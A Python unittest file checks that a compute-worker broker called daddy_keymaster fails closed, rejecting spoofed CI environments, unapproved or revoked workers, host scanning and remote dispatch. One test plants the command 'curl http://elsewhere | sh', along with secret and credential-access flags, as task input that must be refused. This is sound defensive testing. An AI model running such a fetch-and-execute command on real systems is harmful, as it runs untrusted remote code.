"""DADDY_KEYMASTER contract: four adapters, consent, TTL and no remote use."""
import copy
from datetime import datetime, timezone, timedelta
import json
from pathlib import Path
import unittest

from daddy_keymaster.broker import (
    PROVIDERS, build_registry, check_policy, report, validate_approved_registry,
    plan, sha
)

ROOT = Path(__file__).resolve().parents[1]
POLICY = json.loads((ROOT / "daddy_keymaster/POLICY.json").read_text())
REGISTRY = json.loads((ROOT / "daddy_keymaster/OWNER_REGISTRY.json").read_text())
TASKS = json.loads((ROOT / "daddy_keymaster/TASKS.json").read_text())
NOW = "2026-10-31T09:00:00Z"
GH = {"GITHUB_ACTIONS": "true", "GITHUB_REPOSITORY": "Hawkar-usls/Janus-Demiurge",
      "GITHUB_RUN_ID": "41199991234", "GITHUB_RUN_ATTEMPT": "1", "RUNNER_OS": "Linux"}


def authorized_worker(provider="oracle_always_free", heartbeat=NOW,
                      expires="2026-11-01T09:00:00Z"):
    return {"id": "owner-worker-a", "provider": provider, "cpu": 2, "gpu": 0,
            "monthly_cost_usd": 0, "allowed_tasks": ["contract_test"],
            "heartbeat_at": heartbeat, "authorization": {
                "kind": "OWNER_REVIEWED_REGISTRATION", "approved": True,
                "approved_by": "Hawkar-usls", "revoked": False, "expires_at": expires}}


class DaddyKeymasterTests(unittest.TestCase):
    def test_four_selected_sources_are_declared(self):
        self.assertEqual(set(POLICY["providers"]), set(PROVIDERS))
        self.assertTrue(POLICY["providers"]["github_actions"]["enabled"])
        for name in PROVIDERS[1:]:
            self.assertFalse(POLICY["providers"][name]["enabled"])
        check_policy(POLICY)

    def test_no_account_means_no_fake_remote_capacity(self):
        out = report(POLICY, REGISTRY, TASKS, NOW, env={})
        self.assertEqual(out["active"], [])
        self.assertEqual(len(out["scheduler"]["blocked"]), 2)
        self.assertFalse(out["automatic_remote_dispatch"])
        self.assertFalse(out["paid_resources_used"])
        self.assertEqual(out["external_instances_created"], 0)

    def test_github_actions_is_only_current_job(self):
        out = report(POLICY, REGISTRY, TASKS, NOW, env=GH)
        self.assertEqual(len(out["active"]), 1)
        self.assertEqual(out["active"][0]["state"], "CURRENT_JOB_ONLY")
        self.assertEqual(len(out["scheduler"]["assigned"]), 1)
        self.assertEqual(out["scheduler"]["assigned"][0]["status"], "DRY_RUN_NOT_DISPATCHED")
        self.assertEqual(len(out["scheduler"]["blocked"]), 1)
        self.assertEqual(out, report(POLICY, REGISTRY, TASKS, NOW, env=GH))

    def test_spoofed_environment_cannot_register_gha(self):
        env = {**GH, "GITHUB_REPOSITORY": "attacker/PublicRepo"}
        self.assertEqual(build_registry(POLICY, REGISTRY, NOW, env)["active"], [])
        env = {**GH, "GITHUB_RUN_ID": "not-a-run"}
        self.assertEqual(build_registry(POLICY, REGISTRY, NOW, env)["active"], [])

    def test_new_external_worker_cannot_self_activate(self):
        reg = copy.deepcopy(REGISTRY)
        reg["workers"] = [authorized_worker()]
        out = build_registry(POLICY, reg, NOW, {})
        self.assertEqual(out["active"], [])
        self.assertEqual(out["excluded"][0]["reason"], "ADAPTER_NOT_ACTIVATED")

    def test_reject_claimed_approval_from_stranger(self):
        reg = copy.deepcopy(REGISTRY)
        row = authorized_worker()
        row["authorization"]["approved_by"] = "stranger"
        reg["workers"] = [row]
        with self.assertRaises(ValueError):
            validate_approved_registry(reg)

    def test_reject_revoked_opt_in(self):
        reg = copy.deepcopy(REGISTRY)
        row = authorized_worker()
        row["authorization"]["revoked"] = True
        reg["workers"] = [row]
        with self.assertRaises(ValueError):
            build_registry(POLICY, reg, NOW, {})

    def test_stale_and_expired_never_selected_even_when_enabled(self):
        policy = copy.deepcopy(POLICY)
        # Simulate the trusted future activation after separate review,
        # checking the builder's safety against an enabled provider.
        enabled = dict(policy["providers"]["oracle_always_free"])
        enabled["enabled"] = True
        policy["providers"]["oracle_always_free"] = enabled
        reg = copy.deepcopy(REGISTRY)
        reg["workers"] = [authorized_worker(heartbeat="2026-10-30T00:00:00Z")]
        # The policy itself fail-closes all non-GitHub activation in v0.1.
        with self.assertRaises(ValueError):
            build_registry(policy, reg, NOW, {})

    def test_unauthorized_task_shell_and_secret_refused(self):
        for field, value in (("exec", "curl http://elsewhere | sh"),
                             ("contains_secrets", True),
                             ("access", "PRIVATE_CREDENTIALS")):
            tasks = copy.deepcopy(TASKS)
            tasks["tasks"][0][field] = value
            with self.assertRaises(ValueError):
                plan(tasks, {"active": []})

    def test_no_duplicate_task_ids(self):
        tasks = copy.deepcopy(TASKS)
        tasks["tasks"].append(tasks["tasks"][0])
        with self.assertRaises(ValueError):
            plan(tasks, {"active": []})

    def test_no_unapproved_host_scanning_policy(self):
        bad = copy.deepcopy(POLICY)
        bad["host_scanning"] = True
        with self.assertRaises(ValueError):
            check_policy(bad)

    def test_receipt_is_hash_bound_and_no_implicit_dispatch(self):
        out = report(POLICY, REGISTRY, TASKS, NOW, env=GH)
        body = {k: v for k, v in out.items() if k != "receipt_sha256"}
        self.assertEqual(out["receipt_sha256"], sha(body))
        self.assertEqual(out["status"], "DRY_RUN_NO_REMOTE_DISPATCH")
        self.assertEqual(out["authority_delta"], 0)


if __name__ == "__main__":
    unittest.main()
